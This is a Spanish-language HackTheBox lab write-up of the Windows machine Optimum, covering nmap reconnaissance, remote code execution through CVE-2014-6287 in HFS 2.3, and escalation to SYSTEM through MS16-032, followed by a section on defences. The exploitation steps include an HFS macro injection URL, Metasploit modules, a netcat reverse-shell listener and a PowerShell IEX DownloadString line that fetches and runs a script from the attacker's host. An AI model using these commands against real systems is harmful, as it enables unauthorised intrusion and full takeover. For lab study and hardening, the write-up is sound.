---
title: Optimum (HackTheBox Easy)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, windows, rce, privesc, cve, hfs, ms16-032]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Optimum, Optimum HTB, optimum hackthebox]
---

# Optimum — HackTheBox (Easy)

**SO:** Windows · **Dificultad:** Easy · **Skills:** RCE via CVE en aplicacion web, enumeracion de parches faltantes, escalada de privilegios por exploit de kernel Windows (MS16-032 / MS16-098)

Optimum es una maquina Windows clasica que sigue el patron mas repetido en entornos Windows mal mantenidos: un servicio web con CVE conocido expone RCE directo, y la ausencia de parches de seguridad permite escalar a SYSTEM. Es el ejemplo canonico de por que actualizar el software importa tanto como la seguridad perimetral.

> **Nota etica:** HackTheBox es un laboratorio de ciberseguridad legal y autorizado. Todos los ataques documentados aqui se realizan exclusivamente en su entorno controlado.

---

## Objetivo

Obtener acceso como usuario sin privilegios (flag `user.txt`) y escalar a SYSTEM (flag `root.txt`) en una maquina Windows con un servidor HFS 2.3 expuesto.

---

## Acceso a la maquina (paso previo)

1. **Conectarse a la VPN de HTB** — descarga tu fichero de configuracion desde el panel de HTB y ejecuta:
   ```bash
   sudo openvpn lab_<usuario>.ovpn
   ```
   Deja esta terminal abierta durante toda la sesion.

2. **Lanzar la maquina** — en la web de HTB busca "Optimum" en la seccion de maquinas retiradas y haz clic en "Spawn Machine". El panel te dara una IP del rango `10.10.10.x`.

3. **Verificar conectividad:**
   ```bash
   ping -c2 <IP>
   ```

4. A lo largo de este writeup, sustituye `<IP>` por la IP dinamica que HTB te asigne. La IP cambia en cada spawn.

> **Atencion:** las maquinas retiradas (como Optimum) requieren suscripcion **VIP**. Las maquinas activas de la semana son de acceso gratuito. Si usas el **Pwnbox** (Kali en el navegador de HTB), ya viene conectado a la VPN.

---

## Reconocimiento

**Categoria:** escaneo de puertos y deteccion de servicio/version.

El primer paso es identificar que superficie de ataque ofrece la maquina. Se usa nmap con deteccion de version y scripts por defecto.

```bash
nmap -sC -sV -oN optimum_nmap.txt <IP>
```

Resultado relevante:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
| http-title: HFS /
```

Solo hay un puerto abierto: el **80/TCP** con **HFS 2.3** (HttpFileServer de Rejetto). No hay SMB, RDP ni nada mas que explorar. Toda la cadena de ataque pasa por este puerto.

---

## Enumeracion

**Categoria:** identificacion de version vulnerable y busqueda de CVE.

Con la version exacta (`HFS 2.3`) ya tenemos suficiente para buscar vulnerabilidades conocidas.

```bash
searchsploit HFS 2.3
```

Aparece el exploit para **CVE-2014-6287**: ejecucion remota de codigo sin autenticacion via inyeccion en el parametro de busqueda del servidor HFS. Hay modulo en Metasploit y tambien exploit Python manual.

Tambien se puede confirmar la version directamente desde el navegador accediendo a `http://<IP>/`: la pagina de HFS muestra la version en el pie de pagina.

---

## Acceso inicial (foothold)

**Categoria:** RCE via CVE-2014-6287 (HFS 2.3 Remote Code Execution).

**Por que funciona:** HFS 2.3 expone un motor de macros/scripting en el campo de busqueda. Al insertar un caracter nulo (`%00`) seguido de una macro de HFS (por ejemplo `{.exec|comando.}`), el servidor interpreta la macro y ejecuta el comando en el sistema operativo subyacente sin requerir autenticacion. Es una vulnerabilidad de inyeccion de comandos en la capa de la aplicacion.

### Via Metasploit (estandar)

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <IP>
set RPORT 80
set LHOST <tu-IP-tun0>
run
```

Metasploit construye la peticion HTTP con la macro maliciosa, lanza un servidor HTTP temporal para servir el payload, y establece la sesion Meterpreter.

### Via exploit manual (para entender la tecnica)

El exploit Python (disponible en ExploitDB) hace lo mismo en tres pasos:

1. Envia una peticion GET a `http://<IP>/?search=%00{.exec|<comando>.}` para ejecutar un comando arbitrario.
2. El comando descarga un payload (por ejemplo, un `nc.exe` o un script PowerShell) desde tu maquina atacante via un servidor HTTP levantado con Python.
3. El payload ejecutado abre una reverse shell hacia tu listener.

Preparar el listener y el servidor de archivos en tu maquina:

```bash
# Terminal 1 — listener
nc -lvnp 4444

# Terminal 2 — servidor para servir el payload
python3 -m http.server 8080
```

Ajusta los parametros del exploit Python con tu IP y puerto antes de lanzarlo. Los detalles exactos del payload (formato PowerShell, codificacion base64, etc.) pueden variar segun la version del exploit y el entorno; verifica contra la maquina en vivo.

### Resultado

Shell como el usuario `kostas` (usuario sin privilegios). La flag de usuario esta en su escritorio.

---

## Escalada de privilegios

**Categoria:** privesc por parche de kernel Windows faltante (MS16-032 / MS16-098).

**Por que funciona:** Windows tiene un historial de vulnerabilidades en componentes del kernel y el subsistema Win32 que permiten a un proceso sin privilegios elevar tokens de acceso. Sin un programa de gestion de parches activo, estas vulnerabilidades persisten indefinidamente.

### Paso 1 — Identificar parches faltantes

Desde la shell obtenida, enumerar la informacion del sistema:

```bash
# En Meterpreter
sysinfo
run post/multi/recon/local_exploit_suggester
```

O bien descargar y ejecutar **Sherlock** (script PowerShell de roeef) o **Windows Exploit Suggester** en la maquina atacante pasandole el output de `systeminfo`:

```bash
# En la maquina victima
systeminfo > sysinfo.txt

# En tu maquina atacante
python windows-exploit-suggester.py --database 2021-xx-xx-mssb.xls --systeminfo sysinfo.txt
```

La herramienta identifica **MS16-032** (Secondary Logon Handle Privilege Escalation) y/o **MS16-098** como aplicables.

### Paso 2 — Explotar MS16-032

**MS16-032** explota una condicion de carrera en el servicio Secondary Logon de Windows que permite a un proceso sin privilegios crear un proceso con token de SYSTEM.

Via Metasploit (si tienes sesion Meterpreter):

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <numero-sesion>
set LHOST <tu-IP-tun0>
run
```

Via PowerShell manual (Invoke-MS16-032.ps1, disponible en Empire/PowerShellEmpire):

```powershell
# Descargar y ejecutar desde la shell de kostas
IEX (New-Object Net.WebClient).DownloadString('http://<tu-IP>:8080/Invoke-MS16-032.ps1')
Invoke-MS16-032
```

El script lanza un proceso hijo con privilegios de SYSTEM. Si funciona, obtienes una shell como `NT AUTHORITY\SYSTEM`.

> **Nota:** la eleccion entre MS16-032 y MS16-098 depende del nivel exacto de parches de la maquina. Si uno falla, prueba el otro. Verifica cual aplica con Sherlock o el Exploit Suggester antes de lanzar el exploit.

---

## Flags

| Flag | Ubicacion | Comando para leer |
|---|---|---|
| `user.txt` | `C:\Users\kostas\Desktop\user.txt` | `type C:\Users\kostas\Desktop\user.txt` |
| `root.txt` | `C:\Users\Administrator\Desktop\root.txt` | `type C:\Users\Administrator\Desktop\root.txt` |

```
user.txt → <flag>
root.txt → <flag>
```

---

## Patron y teoria

Esta es la seccion mas importante. Optimum ilustra **dos patrones que se repiten constantemente** en entornos Windows reales.

### Patron 1 — Aplicacion web con CVE conocido = RCE directo

**Schema:** servicio expuesto en puerto no protegido + version con CVE publico + sin autenticacion = ejecucion de codigo remoto sin credenciales.

HFS 2.3 no requeria autenticacion para la pagina publica y su motor de macros no filtraba la entrada del usuario. El atacante solo necesitaba conocer la version (visible en la pagina web) y buscar en ExploitDB.

**Como se defiende / como se disena para evitarlo:**
- **No exponer paneles de administracion o gestores de archivos a internet** sin autenticacion y sin una capa de red (VPN, allowlist de IPs).
- **Inventario de software y version tracking**: si sabes que tienes HFS 2.3 instalado, deberias saber que existe CVE-2014-6287. Herramientas como Dependabot (para codigo) o un CMDB (para infraestructura) automatizan esto.
- **WAF o proxy inverso** pueden bloquear los patrones de la macro (`%00{.exec`) como regla de deteccion, aunque no sustituyen al parche.
- Como desarrollador: nunca confies en input de usuario que se interpreta como codigo o comando. Este es exactamente el mismo anti-patron que SQLi o SSTI: interpolacion de input sin sanitizar en un contexto ejecutable. Ver [[08-vulnerabilidades-y-explotacion]].

### Patron 2 — Privesc por parche de kernel faltante (Windows Patch Gap)

**Schema:** sistema Windows sin actualizaciones periodicas + herramienta de enumeracion de parches (Sherlock / WES-NG) + exploit publico para el CVE identificado = escalada a SYSTEM.

Este patron aparece en decenas de maquinas HTB y en pentests reales de entornos corporativos. MS16-032 data de 2016; maquinas sin parchear en 2024 siguen siendo vulnerables a ello.

**Como se defiende / como se disena para evitarlo:**
- **Gestion de parches sistematica**: WSUS, SCCM o una solucion de patch management (Qualys, Tenable). El SLA de parcheo critico deberia ser <30 dias desde la publicacion del boletin.
- **Principio de minimo privilegio**: si el usuario `kostas` no necesita ejecutar procesos del sistema, su cuenta no deberia tener derechos adicionales. Un atacante con acceso como usuario limitado tiene mucho menos margen si el sistema esta bien configurado.
- **EDR / monitoreo de comportamiento**: un EDR moderno detecta la firma comportamental de MS16-032 (creacion de proceso hijo con token elevado via Secondary Logon) aunque el sistema no este parcheado.
- **AppLocker / WDAC**: limitar que binarios y scripts PowerShell pueden ejecutarse bloquea la mayoria de los payloads usados en estos exploits.
- Ver [[06-seguridad-de-sistemas-y-hardening]] para el marco completo de hardening Windows.

### La cadena completa y el salto respecto a Starting Point

En Starting Point los servicios tienen configuraciones incorrectas (credenciales por defecto, SMB abierto). Aqui el salto es:

```
CVE en aplicacion web → RCE como usuario → enumeracion de parches → CVE en kernel → SYSTEM
```

Cada eslabon requiere conocer una herramienta de enumeracion especifica (searchsploit, Sherlock/WES-NG) y entender por que el exploit funciona, no solo lanzarlo. Esta cadena de dos CVEs enlazados es el patron estandar de una auditoria Windows real.

---

## Conexiones

- [[HTB_Easy/00_README]]
- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[08-vulnerabilidades-y-explotacion]]
- [[06-seguridad-de-sistemas-y-hardening]]
